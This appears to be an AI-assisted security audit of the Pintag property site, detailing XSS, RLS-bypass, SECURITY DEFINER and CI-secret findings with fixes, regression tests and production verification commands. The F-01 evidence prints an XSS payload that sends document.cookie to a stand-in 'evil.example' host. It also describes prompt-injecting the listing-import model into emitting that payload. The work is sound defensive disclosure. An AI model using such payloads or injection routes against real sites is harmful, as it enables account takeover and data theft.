# Pintag Security Audit — 2026-08-17

Full-surface, attacker-perspective audit: browser → frontend JS → Supabase
client → auth/JWT → RLS → Postgres → Edge Functions → Storage → external APIs →
Cloudflare → GitHub Pages → GitHub Actions → admin functionality.

**Method.** Static analysis of the whole repository and its full git history,
plus *empirical* testing where it was possible without touching production: a
real PostgreSQL 16 cluster reproducing the production role/grant/policy model,
and a real HTML attribute-value decoder for the XSS work. Every finding below
was reproduced before it was fixed.

**Constraint, stated up front.** This session's network policy blocks outbound
HTTPS to `*.supabase.co`, so **nothing was probed against the live project.**
Everything here is derived from code, migrations and configuration. Findings
that depend on live state (public sign-up, policy drift, dashboard edits) are
called out as such and appear in the verification checklist at the end, which
you must run from your Mac.

---

## Executive summary

**Overall assessment: NEEDS HARDENING** — now materially improved.

Pintag's data layer is, by design, unusually strong for an application of this
size: a genuine default-deny model where exactly one MFA-verified account can
write anything, enforced by `is_pintag_admin()` at a single choke point that
RLS, storage policies and every admin Edge Function all flow through. The
post-breach lockdown work is real and it holds. The SSRF defences on the
outbound-fetch functions are better than most production code I audit.

That is also precisely why the findings matter. When one account is the entire
write surface, **any path that reaches that account's browser session is a
total compromise** — and one existed. Separately, the discipline that was
applied to tables was not applied uniformly to a *view* and to four
`SECURITY DEFINER` functions, each of which is an RLS bypass by construction.

Six confirmed bypasses were found and fixed:

| # | Severity | What |
|---|---|---|
| F-01 | **CRITICAL** | Stored XSS executing in the sole administrator's MFA-verified session |
| F-02 | **HIGH** | Same defect on the public listing page — stored XSS against every visitor |
| F-03 | **HIGH** | `property_engagement` view bypasses RLS; anon enumerates draft + deleted listings |
| F-04 | **MEDIUM** | `rebuild_images_from_registry()` — definer function, no admin gate |
| F-05 | **MEDIUM** | `reset_weekly_views()` — authorization keyed on a deleted, re-registrable email |
| F-06 | **MEDIUM** | `public_listing_stats()` — reports business metrics on unpublished listings |
| F-07 | **MEDIUM** | CI exposes the admin password to pull-request-controlled scripts |

Three further weaknesses are documented but deliberately **not** fixed in code,
because the correct fix is an infrastructure or operator action rather than a
repository change (F-08 – F-10).

---

## 1. Attack surface map

### Publicly reachable without any credential

| Surface | Notes |
|---|---|
| `pintag.io` static pages (GitHub Pages) | `index/listings/listing/agent(s)/for-agents` + **every admin tool** (`admin.html`, `gallery-recovery.html`, `watermark-migrate.html`, `analytics.html`, `analytics-inspector.html`, `intelligence.html`, `agent-setup.html`). Reachable, but gated client-side by `admin-auth.js` and server-side by RLS. |
| Supabase PostgREST with the anon key | `properties` (active, non-deleted only), `parties` (all — agent profiles are public by design), `contacts` (only those attached to an active listing), `listing_events` (SELECT, for the client dedup check), append-only INSERT on the five analytics tables. |
| Anon RPCs | `public_listing_stats`, `increment_listing_view`, `market_transition_stats`, `is_pintag_admin`, the four `check_*_rate_limit` helpers. |
| Edge Functions | Deployed `--no-verify-jwt`, so the gateway passes everything through to each function's own auth. `resolve-map-url` and `public-listings-feed` require **no** auth at all (by design). `smart-listing-importer`, `facebook-listing-fetcher`, `generate-listing-content`, `generate-intelligence-report` each verify the token server-side, require `aal2`, and call `is_pintag_admin()`. |
| Storage | `property-images` and `agent-photos` are public-read CDN buckets. Object names are `Date.now()-random6.ext` — not enumerable in practice, but public once known. |
| Cloudflare Workers | `pintag.io` OG-preview rewriter (4 routes); `img.pintag.io` image CDN (currently inert — `imageCdn: false`). |

### Requires an authenticated (non-admin) account

Only reachable if public sign-up is enabled on the project — an operator toggle
this repository documents as **unverified** (`docs/L1_SECURITY_BASELINE_2026-08-06.md`).
Assume it may be. Such an account gets: no write anywhere, no read of `owners`
or `leads`, and — before this audit — F-04 and F-05.

### Roles that exist

There are effectively **two**: anonymous, and the single administrator
(`cyrora.trading@gmail.com`, password + TOTP). The agent/staff model is retired;
`is_pintag_staff()` is now a thin alias for `is_pintag_admin()`. The legacy
agent portal (`agent-login/dashboard/edit-listing/add-property`) and
`marketing-os.html` are **pruned from the production artifact** by
`deploy-prod.yml` and return 404 on pintag.io. Verified.

---

## 2. Findings

Each finding: what it is → how it is reached → why the existing protection did
not stop it → what the fix does → evidence.

---

### F-01 — CRITICAL — Stored XSS in the administrator's session

**File:** `admin.html` (listings table row template)
**Fixed:** yes · **Test:** `xss-inline-handlers.test.js`

The listings table rendered its action buttons as:

```js
onclick="deleteListing('${esc(p.id)}','${esc(p.title_en||'')}')"
```

`esc()` is an HTML-context escaper: it turns `'` into `&#39;`. That is the
**wrong** escaper for this position, because two parsers read the text in
sequence:

```
raw attribute text ──HTML parser (decodes entities)──▶ JS source ──JS parser──▶ executed
```

The HTML parser decodes `&#39;` back into a live apostrophe *before* the JS
parser ever sees it, so the escaping is undone by the very step it was supposed
to survive.

**Evidence** — the real `esc()` and a real HTML attribute-value decoder, with
the title set to `');fetch('https://evil.example/x?c='+document.cookie);//`:

```
RAW HTML EMITTED:
  <button … onclick="deleteListing('1111…','&#39;);fetch(&#39;https://evil.example/x?c=&#39;+document.cookie);//')">

onclick VALUE AS THE JS ENGINE RECEIVES IT (after HTML entity decoding):
  deleteListing('1111…','');fetch('https://evil.example/x?c='+document.cookie);//')
```

The string literal is closed and the attacker's statement runs.

**Why this is critical, not self-XSS.** Two reasons.

1. **The victim is the only account that can write anything.** Script running in
   that page has the administrator's `aal2` access token in memory and the
   Supabase client already bound to it. It can `PATCH`/`DELETE` any row in
   `properties`, `parties`, `contacts`, `owners`, `leads`, and overwrite or
   delete any object in both storage buckets — the exact capability set the
   2026-08-03 breach used to deface and delete 93 listings. RLS does not help:
   the request *is* the administrator.
2. **The title is not necessarily typed by the administrator.** Listing prose
   enters through Smart Import, the Facebook adapter and Gemini generation
   (`admin.html` → `smart-listing-importer`). An attacker who controls a
   Facebook Marketplace listing controls the text fed to the model; prompt
   injection to emit a chosen literal string is a well-established technique.
   The administrator then reviews and saves it, and the payload fires the next
   time the listings table renders. The attacker never needs credentials.

**Fix.** New `escJs()` escapes for both parsers in the order they run: the JS
layer first (`\` → `\\`, `'` → `\'`, CR/LF/U+2028/U+2029), then the HTML layer
(`&` first — so no attacker-written entity can decode into a quote afterwards —
then `"`, `<`, `>`). The backslash-quote from step 1 is intentionally left
literal: the attribute is delimited by `"`, so a bare `'` is inert to the HTML
parser and reaches the JS parser correctly escaped.

**Why it closes the path.** There is no longer any character sequence the
attacker can supply that survives HTML decoding as an unescaped quote, so the
JS string literal cannot be terminated. The regression test asserts this after
a genuine attribute-value decode — not merely that some characters were
replaced — across 13 payload classes including pre-encoded numeric, hex, named
and double-encoded entities.

---

### F-02 — HIGH — Stored XSS on the public listing page

**File:** `listing.html` (per-unit inquire CTA)
**Fixed:** yes · **Test:** `xss-inline-handlers.test.js`

Identical root cause, different blast radius:

```js
onclick="…ptContactClick({… trackMeta:{unit:'"+esc(unitName)+"'}})"
```

`unitName` is `unit_types.name_en` — free text. The payload executes for
**every visitor** who opens that listing, on the `pintag.io` origin: session
theft is not the concern (visitors are anonymous) but defacement, redirection
to a fraudulent contact channel, and phishing under the real domain all are.
For a property marketplace, a listing page that silently rewrites the WhatsApp
number is a direct financial-fraud vector.

**Fix.** `escJs()` applied to **all 15** interpolations that sit inside an
inline handler in `listing.html`. The other `esc()` calls in that file are in
genuine HTML text or `href="…"` positions and are correct as they stand — the
test asserts zero HTML-context `esc()` remains inside any `onclick`.

Also hardened, same class, not independently exploitable (the values are a
single uppercase character or a UUID) but removed so the pattern cannot be
copied forward: `components.js` (3 avatar `onerror` handlers), `intelligence.js`
(2 insight chips), and `agent-setup.html` — whose avatar fallback now builds
its placeholder with DOM APIs and `textContent`, eliminating the dual-parser
position entirely rather than escaping around it.

---

### F-03 — HIGH — `property_engagement` view bypasses RLS

**File:** `supabase/migrations/20260622000000_engagement_metrics.sql`
**Fixed:** yes · **Test:** `tests/security/regression/rls_regression.sql` §A

In PostgreSQL a view executes with the privileges of its **owner** unless
`security_invoker` is set. RLS on the underlying table is therefore evaluated
as `postgres`, not as the caller. `property_engagement` selects from
`properties` with no status filter and no `security_invoker`.

**Evidence** — reproduced on a real PostgreSQL 16 with Pintag's actual policy
and Supabase's default public-schema grants:

```
=== direct table read as anon (RLS applies correctly) ===
     slug     |   title_en
--------------+--------------
 public-villa | Public Villa
(1 row)

=== read THROUGH THE VIEW as anon (RLS bypassed) ===
     slug     | engagement_tier
--------------+-----------------
 deleted-one  | normal
 public-villa | normal
 secret-draft | normal
(3 rows)
```

An anonymous caller obtains the `id` and `slug` of every **draft** and
**soft-deleted** listing — unpublished inventory, listings deliberately taken
down, and pre-launch pricing work. Those ids are also the key that unlocked
F-06, so the two chained into full metric disclosure for unpublished listings.

**Exposure caveat, stated honestly.** Whether the anon role currently holds
`SELECT` on this view depends on the project's default privileges at the time
the view was created — newer Supabase projects no longer auto-expose new
entities (see the `auto_expose_new_tables` note in `supabase/config.toml`).
I could not check the live grant. **The fix does not depend on the answer**: in
invoker mode the caller's own RLS applies regardless of grant. Step 2 of the
verification checklist settles it empirically.

**Fix.** `ALTER VIEW … SET (security_invoker = true)`. No application code
reads this view (verified by repo-wide grep), so this cannot change any page's
behaviour. The administrator still sees every row — asserted by the test, so a
future change that "fixes" this by denying everyone also fails.

---

### F-04 — MEDIUM — `rebuild_images_from_registry()` had no admin gate

**File:** `supabase/migrations/20260813000000_property_images_registry.sql`
**Fixed:** yes · **Test:** `rls_regression.sql` §B

`SECURITY DEFINER`, `GRANT EXECUTE … TO authenticated`, **no check in the
body** — over `property_images`, whose RLS is admin-only. `SECURITY DEFINER`
bypasses RLS by construction, so the gate must live in the function. Every
sibling (`analytics_*`, `owner_portfolio`, `listing_timeline`,
`rebuild_gallery`) has one; this one was missed when it shipped four days ago.

Any authenticated account could `POST /rest/v1/rpc/rebuild_images_from_registry`
with an arbitrary property UUID and receive that listing's storage URLs —
including for draft and soft-deleted listings, and images already soft-removed
from a gallery. Because `property-images` is public-read, **the URL is the
access**: no further authorization stands between the attacker and the bytes.

**Fix.** `is_pintag_admin(auth.uid())` gate in the body (converted to `plpgsql`
solely to host it; query, ordering and return type unchanged). The test asserts
a non-admin is denied, an admin **without MFA** (`aal1`) is denied, and the
MFA-verified administrator still gets a working DR rebuild.

---

### F-05 — MEDIUM — `reset_weekly_views()` trusted a deleted email address

**File:** `supabase/migrations/20260625000005_reset_weekly_views_admin_only.sql`
**Fixed:** yes · **Test:** `rls_regression.sql` §C

The guard was:

```sql
IF auth.email() != 'admin@pintag.io' THEN RAISE EXCEPTION 'Access denied: admin only';
```

That account was **deliberately deleted** by
`scripts/migrate-admin-to-cyrora-and-remove-legacy-accounts.sql` when
administration moved to cyrora. The address is therefore unclaimed and
re-registrable.

**Attack path.** If public sign-up is enabled — an operator toggle this repo
tracks as unverified — an attacker registers `admin@pintag.io`, satisfies the
string comparison, and the function (which is `SECURITY DEFINER`, so RLS does
not apply) runs `UPDATE properties SET views_week = 0` across every listing.
A self-service sign-up becomes an unauthenticated write to the most protected
table in the schema. It is not catastrophic damage — weekly counters — but it
is a *write* through the boundary, which is the part that matters.

An email address is not an authorization boundary: emails are re-registerable,
and nothing else in this schema keys on one. This was the last function still
doing it.

**Fix.** `is_pintag_admin(auth.uid())` — allowlist membership by immutable auth
UID plus a verified MFA session. Re-registering an address yields a new UID that
is not in `admin_accounts`, so the path closes completely. This also **restores**
the function for the real administrator, who could not call it at all while the
guard named a nonexistent account.

The regression test seeds an attacker account holding exactly
`admin@pintag.io`, asserts the call is denied, and asserts no counter moved.

---

### F-06 — MEDIUM — `public_listing_stats()` reported on unpublished listings

**File:** `supabase/migrations/20260623000004_engagement_badges.sql`
**Fixed:** yes · **Test:** `rls_regression.sql` §D

`SECURITY DEFINER`, granted to `anon`, looked the property up by `id` alone —
no status filter, no `deleted_at` filter. Anyone holding a listing UUID (from
F-03, or simply retained after a listing was unpublished) could read its lead
counts, view counts and district while RLS makes the listing itself invisible
to them.

Aggregates about an unpublished listing are still a disclosure: they confirm
the listing exists and expose commercial demand signals for property the
operator deliberately took off the site — directly useful to a competitor.

**Fix.** Resolve the property through the *same predicate as the public read
policy* and return a neutral all-zero object otherwise (same shape, so it is
not an existence oracle either). Every listing a visitor can actually open
satisfies that predicate — an unavailable/sold/rented listing still has
`status='active'`; only workflow drafts and soft-deletes do not — so social
proof, FOMO lines and district badges are unchanged. The test asserts both
halves: zeros for draft and soft-deleted, **and** unchanged real numbers for
the published listing.

Same migration: `increment_listing_view()` could bump a soft-deleted listing's
counters (its guard predated soft delete); now aligned.

---

### F-07 — MEDIUM — CI exposed the admin password to PR-controlled scripts

**File:** `.github/workflows/security-regression.yml`
**Fixed:** yes

The workflow ran on `pull_request` with `ADMIN_EMAIL`, `ADMIN_PASSWORD`,
`TEST_USER_PASSWORD` and the project keys as **job-level env vars**, then
executed `bash tests/security/run.sh` — a script read *from the pull request's
own checked-out tree*.

Fork PRs are safe (GitHub withholds secrets). But this repository's workflow is
branches within the repository, and **same-repository PRs do receive secrets**.
Anyone able to push a branch and open a PR could edit that script to print or
exfiltrate the administrator's password. MFA limits what the password alone
achieves, which is why this is MEDIUM and not HIGH — but a credential that
should never leave the operator's password manager was one PR away.

Additionally, four workflows had no `permissions:` block and inherited the
repository's default `GITHUB_TOKEN` scopes (read/write on every scope for
repositories created before the default changed).

**Fix.** The credentialed job now carries `if: github.event_name != 'pull_request'`,
so the script that runs with credentials is always one already on `main`.
Coverage is not lost: a new **credential-free** job runs the local regressions
(XSS + PostgreSQL) on every PR and push. Explicit `permissions: contents: read`
added to all four workflows; all 12 now declare least privilege.

---

## 3. Weaknesses documented but NOT fixed in code

These are real, but the correct fix is infrastructure or operator action. A
fragile in-repo workaround would create false confidence.

### F-08 — MEDIUM — Analytics rate limits are keyed on an attacker-controlled value

`check_lead_rate_limit`, `check_listing_event_dedup`,
`check_search_event_rate_limit`, `check_ui_event_rate_limit` and
`check_page_view_rate_limit` all key on `session_id`. That value is generated in
the browser (`session.js`, `crypto.randomUUID()`) and sent by the client, so an
attacker simply sends a fresh UUID per request and every dedup window and rate
limit evaporates.

Consequence: unlimited inserts into all five analytics tables. Poisoned
analytics and intelligence reports, forged "High Interest Property" / "Popular
Listing" badges on the public page (`LEAD_HIGH_INTEREST_MIN` counts
`lead_events` rows), and unbounded table growth.

**Recommended fix (not applied — needs infrastructure):** enforce at the edge,
where the client cannot forge the key. Cloudflare Rate Limiting rules on
`/rest/v1/lead_events`, `/rest/v1/listing_events`, `/rest/v1/page_views`,
`/rest/v1/search_events`, `/rest/v1/ui_events` keyed on **client IP** —
e.g. 60 requests/minute — plus a lower bound on `/auth/v1/*`. The database
checks stay as a second layer. Doing this in Postgres alone is not possible:
PostgREST does not surface a trustworthy client IP to policy expressions.

### F-09 — LOW/MEDIUM — Unauthenticated view-count inflation

`increment_listing_view()` is granted to `anon` with no rate limit at all. An
attacker can loop it to arbitrarily inflate any active listing's `view_count`
and `views_week`, which drive the "Most Viewed in District" badge, the
engagement tiers, and the intelligence reports.

Not fixed in the database deliberately: any counter callable by anonymous users
is inflatable, and the only keys available inside Postgres are client-supplied
(see F-08). Same edge rate-limit remedy; additionally, treat `view_count` as
untrusted when it drives a public badge.

### F-10 — LOW — Unauthenticated Edge Functions have no invocation limit

Functions deploy with `--no-verify-jwt` (correct — each enforces its own auth),
which means `resolve-map-url` and `public-listings-feed` are callable by anyone,
unmetered. Neither leaks data (`resolve-map-url` is allowlisted to Google Maps
hosts with a final-host re-check; the feed exposes only fields already public),
but both burn Edge Function invocation quota and can be used for
denial-of-wallet. The four expensive AI functions are correctly admin+MFA gated,
so **Gemini spend is not exposed** — the significant cost risk is absent.

Remedy: Cloudflare rate limiting in front of `/functions/v1/*`, or a per-IP cap
inside the two open functions.

---

## 4. Verified NOT vulnerable — and why

Stated explicitly, because "we looked and it held" is worth as much as a finding.

| Area | Why it holds |
|---|---|
| **Anon key in `config.js` / worker** | Correct and intended. It is a publishable identifier; RLS is the boundary. Decoded all three committed JWTs — every one carries `"role":"anon"`. No `service_role` key anywhere in the working tree or in **any of the 50 commits** in history. |
| **Core-table RLS** | Every table in the schema has RLS enabled (checked exhaustively: zero `CREATE TABLE` without a matching `ENABLE ROW LEVEL SECURITY`). Writes on `properties`/`parties`/`contacts`/`owners`/`unit_types`/`leads` require `is_pintag_admin()`; `anon` additionally has table-level `INSERT/UPDATE/DELETE` revoked as a floor beneath RLS. Regression-tested: a non-admin `UPDATE properties` changes nothing. |
| **`owners` and `leads`** | No anon policy *of any kind* — default-deny returns zero rows. Internal owner phone numbers and the CRM pipeline are not reachable anonymously. |
| **MFA is enforced at the data layer, not just the UI** | `is_pintag_admin()` requires `auth.jwt()->>'aal' = 'aal2'`, and every RLS policy, storage policy and admin Edge Function flows through that one function. An `aal1` session — password accepted, TOTP not yet completed — passes nothing. Regression-tested. |
| **SSRF defences** | `facebook-listing-fetcher`, `smart-listing-importer` and `resolve-map-url` each apply the full checklist: https-only, host allowlist *before* the fetch, **final-host re-validation after redirects**, `content-type` must be an image, declared *and* actual byte caps. The redirect re-check is the step most implementations omit; it is present in all three. No path reaches localhost, link-local, or cloud metadata. |
| **Storage** | Both buckets: writes require `is_pintag_admin()`, INSERT additionally constrained to `jpg/jpeg/png/webp/gif`. **SVG and HTML cannot be uploaded**, closing the classic stored-XSS-via-bucket path. Object names are server-generated (`Date.now()-random6.ext`), so no traversal and no overwrite of another listing's image. The `20260804150000` hard-fix correctly drops policies *by iterating `pg_policies`* rather than by name — the right way to reconcile a drifted database. |
| **Image CDN Worker** | Fixed origin constant, single path prefix allowlist, `..`/`%2e%2e` rejected, GET/HEAD only, cookies stripped. Not an open proxy. Currently inert anyway (`imageCdn: false`). |
| **OG preview Worker** | Uses `HTMLRewriter`'s `setAttribute`/`setInnerContent`, which escape structurally — listing text cannot break out of the rewritten `<head>`. Slug is `encodeURIComponent`-wrapped into a PostgREST `eq.` filter; `&` is encoded, so no parameter injection. Fetches with the anon key, so RLS still hides drafts. |
| **Client-side escaping generally** | Discipline is good: listing titles, descriptions, highlights, neighbourhood insights, agent names and bios all render through `esc()` into HTML-text or attribute positions correctly. The failure was confined to the JS-string-inside-attribute position (F-01/F-02). |
| **Injection** | All queries are PostgREST filters or parameterised RPC arguments. No dynamic SQL built from user input. Every `SECURITY DEFINER` function sets `search_path = public`. No `eval`, no `new Function`. |
| **Supply chain** | Zero runtime npm dependencies on the deployed site — no bundler, no CDN scripts beyond `@supabase/supabase-js`. Nothing to compromise. No `pull_request_target` in any workflow. `pintag-studio/.github/workflows/*` (which do use a service-role key) are **not** at the repository root and therefore never execute. |
| **Legacy surfaces** | `agent-login/dashboard/edit-listing/add-property` and `marketing-os.html` are removed from the production artifact by `deploy-prod.yml`. Confirmed in the workflow. |
| **Asset cache poisoning** | Every first-party asset URL is stamped with the commit SHA at deploy, so a stale CDN entry has no URL to serve. |

---

## 5. Realistic attack paths

| Attack | Entry | Privilege needed | Steps | Impact | Prior protection | Why it failed | Sev | Status |
|---|---|---|---|---|---|---|---|---|
| Admin session takeover | Facebook listing → Smart Import → `title_en` | None | Post a listing with a payload title; wait for import; admin opens the listings table | Full write to every table + both buckets — repeat of the 2026-08-03 breach without needing a password | `esc()` | HTML entity decoding runs *before* JS parsing, undoing it | **CRIT** | **Fixed** (F-01) |
| Public listing defacement / contact hijack | `unit_types.name_en` | None | Same chain, unit-type name; every visitor executes it | Fraudulent WhatsApp number under the real domain; phishing | `esc()` | Same | **HIGH** | **Fixed** (F-02) |
| Unpublished-inventory intelligence | `GET /rest/v1/property_engagement` | None | One request; read ids/slugs of drafts + deleted; feed each to `public_listing_stats` | Competitor sees pipeline, pre-launch listings, and demand per listing | RLS on `properties` | View ran as owner, so RLS never applied | **HIGH** | **Fixed** (F-03, F-06) |
| Draft photo exfiltration | `POST /rpc/rebuild_images_from_registry` | Any account | Call with any property UUID; fetch returned public URLs | Unreleased listing photography | Admin-only RLS on `property_images` | `SECURITY DEFINER` bypasses RLS; no body gate | **MED** | **Fixed** (F-04) |
| Write through the boundary via a deleted email | `/auth/v1/signup` → `/rpc/reset_weekly_views` | None → self-registered | Register `admin@pintag.io`; call the RPC | Mass write to `properties` | `auth.email()` comparison | The named account was deleted; the address is re-registrable | **MED** | **Fixed** (F-05) |
| Admin credential theft via CI | Open a same-repo PR editing `tests/security/run.sh` | Repo write | PR runs the edited script with `ADMIN_PASSWORD` in env | Admin password (MFA still required to use it) | Fork-PR secret withholding | Does not apply to same-repository PRs | **MED** | **Fixed** (F-07) |
| Analytics poisoning / fake badges | Bulk POST to `lead_events` | None | Rotate `session_id` per request | Forged "High Interest" badges, corrupted intelligence reports | Per-session DB rate limits | The session key is supplied by the client | **MED** | **Not fixed** (F-08) — needs edge rate limiting |
| Denial-of-wallet | `/functions/v1/resolve-map-url` | None | Loop | Edge invocation quota burn | None | Function is intentionally unauthenticated | **LOW** | **Not fixed** (F-10) |

---

## 6. What was changed

**Application**
- `admin.html` — added `escJs()`; both listings-table handlers now use it.
- `listing.html` — added `escJs()`; **all 15** in-handler interpolations converted.
- `components.js` — `_ptEscJs()`; 3 avatar `onerror` handlers.
- `intelligence.js` — `escJs()`; 2 insight-chip handlers.
- `agent-setup.html` — avatar fallback rebuilt with DOM APIs; inline handler removed entirely.

**Database** — `supabase/migrations/20260817000000_security_audit_hardening.sql`
(idempotent, atomic, per-item rollback documented inline; **touches no row of data**)
- `property_engagement` → `security_invoker = true`
- `rebuild_images_from_registry()` → `is_pintag_admin()` gate
- `reset_weekly_views()` → `is_pintag_admin()` gate (replacing the email check)
- `public_listing_stats()` → public-visibility predicate
- `increment_listing_view()` → excludes soft-deleted listings

**CI**
- `security-regression.yml` — credentialed job excluded from `pull_request`; new credential-free job for PRs; `permissions: contents: read`.
- `contact-tracking-tests.yml`, `intelligence-tests.yml`, `pricing-tests.yml` — least-privilege `permissions` blocks.

**Tests**
- `xss-inline-handlers.test.js` — 15 tests. 13 payload classes × 4 implementations, asserted **after a real HTML attribute-value decode**, plus call-site guards that fail if HTML-context `esc()` reappears inside any inline handler.
- `tests/security/regression/{schema,rls_regression}.sql` + `run-local-pg.sh` — 27 assertions on a throwaway PostgreSQL cluster loaded with production-shaped roles, grants, policies and **pre-fix** function bodies. **Verified to fail without the migration.**

**Test results:** 335 existing tests pass, plus 15 new; both Playwright suites
covering the modified files pass (28/28 agent-visibility, 22/22
contact-tracking — the latter directly exercising the rewritten
`ptContactClick` handlers).

---

## 7. Remaining risk — what repository inspection cannot establish

Be clear-eyed about this. Everything above is derived from code. It cannot tell
you:

1. **Whether the deployed database matches these migrations.** The 2026-08-04
   incident was caused by exactly this gap — production carried
   dashboard-created policies that no migration file described, and the earlier
   storage lockdown was a no-op because it dropped policies *by name*. Only a
   live `pg_policies` query settles it.
2. **Whether public sign-up is disabled.** F-05's severity, and whether F-04 is
   reachable at all, both hinge on this. It is documented as an open operator
   toggle and I could not reach the endpoint.
3. **Whether the deployed Edge Function code matches this repository.** The repo
   itself records a past incident where production ran a stale build with the
   retired staff-based authorization.
4. **Whether the anon role currently holds SELECT on `property_engagement`.**
   The fix is grant-independent, but the pre-fix exposure window is not knowable
   from here.
5. **Whether response headers are set.** GitHub Pages sets no CSP, HSTS,
   `X-Frame-Options` or `Referrer-Policy`, and there is no `_headers` file in
   the repository — so any such headers exist only as Cloudflare Transform
   Rules I cannot see. **A CSP would have significantly blunted F-01/F-02**, and
   remains the single highest-value defence-in-depth control still available.
6. **Whether MFA is actually enrolled** on the administrator account, and
   whether Supabase project-level MFA is enabled at all.

---

## 8. Production verification checklist

Run from your Mac. Read-only unless marked. Set up first:

```bash
export SB=https://eoladhcljbpbhnrmmpev.supabase.co
export ANON='<the anon key from config.prod.js>'
```

**1 — Public sign-up must be disabled** (settles F-05's reachability)

```bash
curl -s -o /dev/null -w '%{http_code}\n' -X POST "$SB/auth/v1/signup" \
  -H "apikey: $ANON" -H 'Content-Type: application/json' \
  -d '{"email":"probe+signup@example.com","password":"Test-1234!"}'
```
PASS = `400`/`403`/`422` (signups disabled). **FAIL = `200`/`201`** — an account was created; delete it in the dashboard and turn sign-up off immediately.

**2 — The view no longer leaks unpublished listings** (F-03)

```bash
# Before deploying the migration this returns draft/deleted rows; after, only live ones.
curl -s "$SB/rest/v1/property_engagement?select=slug&limit=200" -H "apikey: $ANON" | jq 'length'
curl -s "$SB/rest/v1/properties?select=slug&limit=200"           -H "apikey: $ANON" | jq 'length'
```
PASS = the two counts are **equal**. (A `404`/`permission denied` on the first is also a pass — it means anon never had the grant.)

**3 — Definer RPCs reject anonymous callers** (F-04, F-05, F-06)

```bash
curl -s -X POST "$SB/rest/v1/rpc/rebuild_images_from_registry" -H "apikey: $ANON" \
  -H 'Content-Type: application/json' -d '{"p_property":"00000000-0000-0000-0000-000000000000"}'
curl -s -X POST "$SB/rest/v1/rpc/reset_weekly_views" -H "apikey: $ANON" \
  -H 'Content-Type: application/json' -d '{}'
```
PASS = both return an error (`admin only` / permission denied). Neither may return data or succeed.

Then, with a **draft** listing's UUID from your admin panel:
```bash
curl -s -X POST "$SB/rest/v1/rpc/public_listing_stats" -H "apikey: $ANON" \
  -H 'Content-Type: application/json' -d '{"p_listing_id":"<DRAFT-UUID>"}'
```
PASS = all zeroes and `"district": null`. Repeat with a **live** listing UUID: it must return real numbers (proves the fix didn't break social proof).

**4 — Internal tables stay closed**

```bash
for t in owners leads intelligence_reports property_images admin_accounts properties_row_snapshots; do
  printf '%-28s %s\n' "$t" "$(curl -s "$SB/rest/v1/$t?select=*&limit=1" -H "apikey: $ANON")"
done
```
PASS = every line is an empty array `[]` or a permission error. Any row of data is a finding.

**5 — Policy drift check** (Supabase SQL editor — the one thing no HTTP probe can replace)

```sql
-- (a) Any permissive policy that grants a write to anon/authenticated
--     WITHOUT going through is_pintag_admin() is the 2026-08-03 pattern.
SELECT schemaname, tablename, policyname, cmd, roles, qual, with_check
FROM pg_policies
WHERE schemaname IN ('public','storage')
  AND cmd <> 'SELECT'
  AND (qual IS NULL OR qual NOT LIKE '%is_pintag_admin%')
  AND (with_check IS NULL OR with_check NOT LIKE '%is_pintag_admin%')
ORDER BY schemaname, tablename;
-- EXPECT: only the five "anon insert <analytics table>" rows. Anything else, investigate.

-- (b) Every table has RLS on.
SELECT relname FROM pg_class c JOIN pg_namespace n ON n.oid=c.relnamespace
WHERE n.nspname='public' AND c.relkind='r' AND NOT c.relrowsecurity;
-- EXPECT: zero rows.

-- (c) No view silently bypasses RLS (the F-03 class).
SELECT c.relname, c.reloptions FROM pg_class c JOIN pg_namespace n ON n.oid=c.relnamespace
WHERE n.nspname='public' AND c.relkind='v';
-- EXPECT: every view lists security_invoker=true.

-- (d) Every SECURITY DEFINER function reachable by anon/authenticated either
--     gates internally or is intentionally public.
SELECT p.proname, pg_get_functiondef(p.oid) LIKE '%is_pintag_admin%' AS has_gate
FROM pg_proc p JOIN pg_namespace n ON n.oid=p.pronamespace
WHERE n.nspname='public' AND p.prosecdef
ORDER BY has_gate, p.proname;
-- REVIEW every has_gate=false row and confirm each is deliberately public
-- (public_listing_stats, increment_listing_view, market_transition_stats,
--  the check_*_rate_limit helpers, is_pintag_admin itself).

-- (e) Storage: 8 policies, every write referencing is_pintag_admin.
SELECT policyname, cmd, roles, qual, with_check FROM pg_policies
WHERE schemaname='storage' AND tablename='objects' ORDER BY policyname;
```

**6 — MFA actually blocks a password-only session** (the highest-value single check)

Sign in as the administrator and **stop before entering the TOTP code**, then
with that `aal1` access token:
```bash
curl -s -X PATCH "$SB/rest/v1/properties?id=eq.<ANY-UUID>" \
  -H "apikey: $ANON" -H "Authorization: Bearer <AAL1_TOKEN>" \
  -H 'Content-Type: application/json' -H 'Prefer: return=representation' \
  -d '{"title_en":"mfa-probe"}'
```
PASS = `[]` (zero rows updated). Anything else means the AAL2 gate is not live.

**7 — Response headers** (F-05 in §7; run against the real site)

```bash
curl -sI https://pintag.io/listing.html | grep -iE 'content-security-policy|strict-transport|x-frame|x-content-type|referrer-policy|permissions-policy'
```
Any missing header is a defence-in-depth gap. **Adding a CSP is the top
recommendation** — it would have contained both XSS findings.

**8 — Local regressions (no credentials, run any time)**

```bash
cd /path/to/pintag
node --test xss-inline-handlers.test.js          # 15 tests
bash tests/security/regression/run-local-pg.sh   # 27 assertions
```

**9 — Deploy the migration**

`Actions → Apply DB Migration (production) → Run workflow → type APPLY`.
The workflow dry-runs first and refuses to proceed if anything other than the
expected migration is pending — check `EXPECTED_MIGRATION` names
`20260817000000_security_audit_hardening` before running. Then re-run steps 2–4.

---

## 9. Top 5 things an attacker could realistically have exploited

1. **Stored XSS into the administrator's session (F-01)** — the only account
   with write access anywhere, reachable without a single credential via
   Smart Import. This is the finding that matters; everything else is smaller.
2. **Stored XSS on the public listing page (F-02)** — a rewritten WhatsApp
   number on a real `pintag.io` listing is direct financial fraud against
   your buyers.
3. **Unpublished-inventory enumeration (F-03 + F-06)** — one anonymous GET
   yields every draft and deleted listing, then per-listing demand metrics.
4. **Analytics poisoning (F-08, still open)** — trivially forged "High Interest"
   badges on the public site and corrupted intelligence reports, because the
   rate-limit key is chosen by the client.
5. **Admin password exfiltration through CI (F-07)** — one pull request.

---

*Audit performed 2026-08-17 against commit `7100c87`. Fixes on branch
`claude/pintag-security-audit-ynsrgq`.*
